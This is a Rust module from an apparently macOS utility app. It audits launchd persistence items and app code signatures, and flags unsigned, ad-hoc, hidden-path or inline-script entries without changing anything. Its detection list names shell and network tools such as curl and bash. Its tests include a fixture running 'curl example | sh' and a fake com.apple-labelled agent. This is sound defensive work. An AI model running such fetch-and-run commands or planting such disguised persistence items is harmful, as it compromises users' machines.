//! Security audit (spec §23, §27): an experimental audit, not antivirus protection. It lists what
//! starts automatically (LaunchAgents and LaunchDaemons) and how apps and helper programs are
//! signed, and points out unusual traits. It never changes anything: the user acts in System
//! Settings or Finder.

use std::path::{Path, PathBuf};
use std::process::Command;

use rayon::prelude::*;
use serde::Serialize;

use crate::filesystem::worker_pool;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum SignatureKind {
    /// Signed by Apple (macOS components).
    Apple,
    AppStore,
    DeveloperId,
    /// Signed with a development certificate.
    Development,
    AdHoc,
    Unsigned,
    /// Has a signature that does not verify (modified after signing).
    Invalid,
    Unknown,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Signature {
    pub kind: SignatureKind,
    pub team_id: Option<String>,
    /// First "Authority=" line (e.g. "Developer ID Application: Company (TEAMID)").
    pub authority: Option<String>,
}

/// Parses `codesign -dv --verbose=2` output (it writes to stderr).
pub fn parse_codesign(out: &str) -> Signature {
    if out.contains("not signed at all") {
        return Signature { kind: SignatureKind::Unsigned, team_id: None, authority: None };
    }
    let authority = out.lines().find_map(|l| l.strip_prefix("Authority=")).map(String::from);
    let team_id = out.lines().find_map(|l| l.strip_prefix("TeamIdentifier=")).filter(|t| *t != "not set").map(String::from);
    let kind = if out.lines().any(|l| l == "Signature=adhoc") {
        SignatureKind::AdHoc
    } else {
        match authority.as_deref() {
            Some("Software Signing" | "macOS Software Signing") => SignatureKind::Apple,
            _ if out.lines().any(|l| l.starts_with("Platform identifier=")) => SignatureKind::Apple,
            Some("Apple Mac OS Application Signing") => SignatureKind::AppStore,
            Some(a) if a.starts_with("Developer ID Application") => SignatureKind::DeveloperId,
            Some(a) if a.starts_with("Apple Development") || a.starts_with("Mac Developer") => SignatureKind::Development,
            Some(_) => SignatureKind::Unknown,
            None => SignatureKind::Unknown,
        }
    };
    Signature { kind, team_id, authority }
}

pub fn signature_of(path: &Path) -> Signature {
    let Ok(out) = Command::new("/usr/bin/codesign").args(["-dv", "--verbose=2"]).arg(path).output() else {
        return Signature { kind: SignatureKind::Unknown, team_id: None, authority: None };
    };
    let mut sig = parse_codesign(&String::from_utf8_lossy(&out.stderr));
    if !matches!(sig.kind, SignatureKind::Unsigned | SignatureKind::Unknown) {
        // Not `--strict`: it also rejects Finder metadata that updaters leave (Chrome, Zoom…),
        // which Gatekeeper accepts.
        let valid = Command::new("/usr/bin/codesign").arg("--verify").arg(path).output().map(|o| o.status.success()).unwrap_or(true);
        if !valid {
            sig.kind = SignatureKind::Invalid;
        }
    }
    sig
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum Level {
    Info,
    Notice,
    Attention,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Finding {
    pub level: Level,
    pub code: String,
}

fn finding(level: Level, code: &str) -> Finding {
    Finding { level, code: code.into() }
}

// MARK: - Persistence

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum PersistenceScope {
    /// ~/Library/LaunchAgents: runs as the user, installed without admin rights.
    User,
    /// /Library/LaunchAgents: runs as each user, installed by an admin.
    AllUsers,
    /// /Library/LaunchDaemons: runs as root.
    System,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PersistenceItem {
    pub scope: PersistenceScope,
    pub plist: String,
    pub label: Option<String>,
    pub program: Option<String>,
    pub arguments: Vec<String>,
    pub run_at_load: bool,
    pub keep_alive: bool,
    pub disabled: bool,
    pub program_exists: bool,
    pub signature: Option<Signature>,
    /// The app bundle the program belongs to, if any.
    pub app: Option<String>,
    pub findings: Vec<Finding>,
}

const INTERPRETERS: &[&str] = &["sh", "bash", "zsh", "python", "python3", "perl", "ruby", "osascript", "node", "curl"];

/// Heuristics, deliberately neutral: they describe what is unusual, they do not accuse.
pub fn assess(item: &PersistenceItem) -> Vec<Finding> {
    let mut out = Vec::new();
    let program = item.program.as_deref().unwrap_or("");
    if item.program.is_none() {
        out.push(finding(Level::Notice, "noProgram"));
    } else if !item.program_exists {
        out.push(finding(Level::Info, "programMissing"));
    }
    if let Some(sig) = &item.signature {
        match sig.kind {
            SignatureKind::Unsigned => out.push(finding(Level::Attention, "unsigned")),
            SignatureKind::AdHoc => out.push(finding(Level::Notice, "adhoc")),
            SignatureKind::Invalid => out.push(finding(Level::Attention, "invalidSignature")),
            _ => {}
        }
        if item.label.as_deref().is_some_and(|l| l.starts_with("com.apple.")) && item.scope != PersistenceScope::System && sig.kind != SignatureKind::Apple {
            out.push(finding(Level::Attention, "applePrefixNotApple"));
        }
    }
    let lower = program.to_lowercase();
    if ["/tmp/", "/private/tmp/", "/users/shared/", "/private/var/tmp/"].iter().any(|p| lower.starts_with(p)) {
        out.push(finding(Level::Attention, "temporaryLocation"));
    }
    if Path::new(program).components().any(|c| c.as_os_str().to_string_lossy().starts_with('.') && c.as_os_str() != "..") {
        out.push(finding(Level::Notice, "hiddenLocation"));
    }
    let exe = Path::new(program).file_name().map(|n| n.to_string_lossy().to_lowercase()).unwrap_or_default();
    if INTERPRETERS.contains(&exe.as_str()) && item.arguments.iter().any(|a| a == "-c" || a == "-e") {
        out.push(finding(Level::Notice, "inlineScript"));
    }
    if item.disabled {
        out.push(finding(Level::Info, "disabled"));
    }
    out
}

fn read_launchd_plist(plist: &Path, scope: PersistenceScope) -> Option<PersistenceItem> {
    let value = plist::Value::from_file(plist).ok()?;
    let dict = value.as_dictionary()?;
    let s = |k: &str| dict.get(k).and_then(|v| v.as_string()).map(String::from);
    let b = |k: &str| dict.get(k).and_then(|v| v.as_boolean()).unwrap_or(false);
    let arguments: Vec<String> = dict.get("ProgramArguments").and_then(|v| v.as_array()).map(|a| a.iter().filter_map(|x| x.as_string().map(String::from)).collect()).unwrap_or_default();
    let program = s("Program").or_else(|| arguments.first().cloned());
    Some(PersistenceItem {
        scope,
        plist: plist.display().to_string(),
        label: s("Label"),
        program_exists: program.as_ref().is_some_and(|p| Path::new(p).exists()),
        app: program.as_ref().and_then(|p| crate::processes::app_bundle_of(Path::new(p))).map(|a| a.display().to_string()),
        program,
        arguments: arguments.into_iter().skip(1).collect(),
        run_at_load: b("RunAtLoad"),
        keep_alive: dict.get("KeepAlive").is_some_and(|v| v.as_boolean() != Some(false)),
        disabled: b("Disabled"),
        signature: None,
        findings: Vec::new(),
    })
}

pub fn persistence(home: &Path) -> Vec<PersistenceItem> {
    let dirs = [
        (home.join("Library/LaunchAgents"), PersistenceScope::User),
        (PathBuf::from("/Library/LaunchAgents"), PersistenceScope::AllUsers),
        (PathBuf::from("/Library/LaunchDaemons"), PersistenceScope::System),
    ];
    let plists: Vec<(PathBuf, PersistenceScope)> = dirs
        .iter()
        .flat_map(|(d, scope)| {
            std::fs::read_dir(d)
                .map(|r| r.flatten().map(|e| e.path()).filter(|p| p.extension().is_some_and(|e| e == "plist")).map(|p| (p, *scope)).collect::<Vec<_>>())
                .unwrap_or_default()
        })
        .collect();
    let mut items: Vec<PersistenceItem> = worker_pool().install(|| {
        plists
            .par_iter()
            .filter_map(|(p, scope)| read_launchd_plist(p, *scope))
            .map(|mut item| {
                if item.program_exists {
                    let target = item.app.clone().map(PathBuf::from).unwrap_or_else(|| PathBuf::from(item.program.clone().unwrap_or_default()));
                    item.signature = Some(signature_of(&target));
                }
                item.findings = assess(&item);
                item
            })
            .collect()
    });
    items.sort_by_key(|i| (std::cmp::Reverse(i.findings.iter().map(|f| f.level).max()), i.label.clone()));
    items
}

// MARK: - Apps

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AppAudit {
    pub path: String,
    pub name: String,
    pub signature: Signature,
    /// `spctl` result ("Notarized Developer ID", "Mac App Store"…), None when Gatekeeper rejects
    /// it. Only assessed for apps without an App Store, Apple or Developer ID signature: the
    /// assessment can take seconds per app (online notarization check).
    pub gatekeeper: Option<String>,
    pub gatekeeper_checked: bool,
    pub quarantined: bool,
    pub findings: Vec<Finding>,
}

fn gatekeeper(app: &Path) -> Option<String> {
    let out = Command::new("/usr/sbin/spctl").args(["--assess", "--type", "execute", "-vv"]).arg(app).output().ok()?;
    let text = String::from_utf8_lossy(&out.stderr);
    if !out.status.success() {
        return None;
    }
    Some(text.lines().find_map(|l| l.strip_prefix("source=")).unwrap_or("accepted").to_string())
}

fn quarantined(path: &Path) -> bool {
    use std::os::unix::ffi::OsStrExt;
    let Ok(c) = std::ffi::CString::new(path.as_os_str().as_bytes()) else { return false };
    let name = c"com.apple.quarantine";
    unsafe { libc::getxattr(c.as_ptr(), name.as_ptr(), std::ptr::null_mut(), 0, 0, libc::XATTR_NOFOLLOW) >= 0 }
}

pub fn app_findings(sig: &Signature, gatekeeper: &Option<String>, checked: bool) -> Vec<Finding> {
    let mut out = Vec::new();
    match sig.kind {
        SignatureKind::Unsigned => out.push(finding(Level::Attention, "unsigned")),
        SignatureKind::Invalid => out.push(finding(Level::Attention, "invalidSignature")),
        SignatureKind::AdHoc => out.push(finding(Level::Notice, "adhoc")),
        SignatureKind::Development => out.push(finding(Level::Notice, "developmentSigned")),
        _ => {}
    }
    if checked && gatekeeper.is_none() && !matches!(sig.kind, SignatureKind::Unsigned | SignatureKind::Invalid) {
        out.push(finding(Level::Notice, "gatekeeperRejected"));
    }
    out
}

pub fn audit_apps(apps: &[PathBuf], progress: &(dyn Fn(u64, u64) + Sync)) -> Vec<AppAudit> {
    let done = std::sync::atomic::AtomicU64::new(0);
    let total = apps.len() as u64;
    let mut out: Vec<AppAudit> = worker_pool().install(|| {
        apps.par_iter()
            .map(|p| {
                let signature = signature_of(p);
                let check = !matches!(signature.kind, SignatureKind::Apple | SignatureKind::AppStore | SignatureKind::DeveloperId);
                let gk = if check { gatekeeper(p) } else { None };
                let findings = app_findings(&signature, &gk, check);
                progress(done.fetch_add(1, std::sync::atomic::Ordering::Relaxed) + 1, total);
                AppAudit {
                    name: crate::applications::read_bundle(p).name.unwrap_or_else(|| p.file_stem().map(|s| s.to_string_lossy().into_owned()).unwrap_or_default()),
                    path: p.display().to_string(),
                    quarantined: quarantined(p),
                    signature,
                    gatekeeper: gk,
                    gatekeeper_checked: check,
                    findings,
                }
            })
            .collect()
    });
    out.sort_by_key(|a| (std::cmp::Reverse(a.findings.iter().map(|f| f.level).max()), a.name.to_lowercase()));
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_codesign_output() {
        let xcode = "Identifier=com.apple.dt.Xcode\nAuthority=Apple Mac OS Application Signing\nAuthority=Apple Root CA\nTeamIdentifier=59GAB85EFG\n";
        assert_eq!(parse_codesign(xcode).kind, SignatureKind::AppStore);
        let devid = "Authority=Developer ID Application: Docker Inc (9BNSXJN65R)\nTeamIdentifier=9BNSXJN65R\n";
        let s = parse_codesign(devid);
        assert_eq!((s.kind, s.team_id.as_deref()), (SignatureKind::DeveloperId, Some("9BNSXJN65R")));
        assert_eq!(parse_codesign("Signature=adhoc\nTeamIdentifier=not set\n").kind, SignatureKind::AdHoc);
        assert_eq!(parse_codesign("/x: code object is not signed at all\n").kind, SignatureKind::Unsigned);
        assert_eq!(parse_codesign("Authority=Software Signing\n").kind, SignatureKind::Apple);
        assert_eq!(parse_codesign("Platform identifier=26\nAuthority=macOS Software Signing\n").kind, SignatureKind::Apple);
    }

    #[test]
    fn real_signatures() {
        assert_eq!(signature_of(Path::new("/bin/ls")).kind, SignatureKind::Apple);
    }

    fn item(program: &str, args: &[&str], label: &str, sig: SignatureKind, scope: PersistenceScope) -> PersistenceItem {
        PersistenceItem {
            scope,
            plist: "/x.plist".into(),
            label: Some(label.into()),
            program: Some(program.into()),
            arguments: args.iter().map(|s| s.to_string()).collect(),
            run_at_load: true,
            keep_alive: false,
            disabled: false,
            program_exists: true,
            signature: Some(Signature { kind: sig, team_id: None, authority: None }),
            app: None,
            findings: Vec::new(),
        }
    }

    #[test]
    fn heuristics() {
        let codes = |i: &PersistenceItem| assess(i).into_iter().map(|f| f.code).collect::<Vec<_>>();
        let normal = item("/Applications/Zoom.app/Contents/MacOS/updater", &[], "us.zoom.updater", SignatureKind::DeveloperId, PersistenceScope::AllUsers);
        assert!(assess(&normal).is_empty());
        let odd = item("/Users/Shared/.hidden/agent", &[], "com.apple.softwareupdate.fake", SignatureKind::Unsigned, PersistenceScope::User);
        let c = codes(&odd);
        for expected in ["unsigned", "applePrefixNotApple", "temporaryLocation", "hiddenLocation"] {
            assert!(c.contains(&expected.to_string()), "{expected} in {c:?}");
        }
        let script = item("/bin/bash", &["-c", "curl example | sh"], "net.example", SignatureKind::Apple, PersistenceScope::User);
        assert_eq!(codes(&script), vec!["inlineScript"]);
        let mut gone = normal.clone();
        gone.program_exists = false;
        gone.signature = None;
        assert_eq!(codes(&gone), vec!["programMissing"]);
    }

    #[test]
    fn app_rules() {
        let sig = |k| Signature { kind: k, team_id: None, authority: None };
        assert!(app_findings(&sig(SignatureKind::DeveloperId), &Some("Notarized Developer ID".into()), true).is_empty());
        assert_eq!(app_findings(&sig(SignatureKind::AdHoc), &None, true).iter().map(|f| f.code.as_str()).collect::<Vec<_>>(), vec!["adhoc", "gatekeeperRejected"]);
        assert!(app_findings(&sig(SignatureKind::DeveloperId), &None, false).is_empty());
        assert_eq!(app_findings(&sig(SignatureKind::Unsigned), &None, true).len(), 1);
    }
}
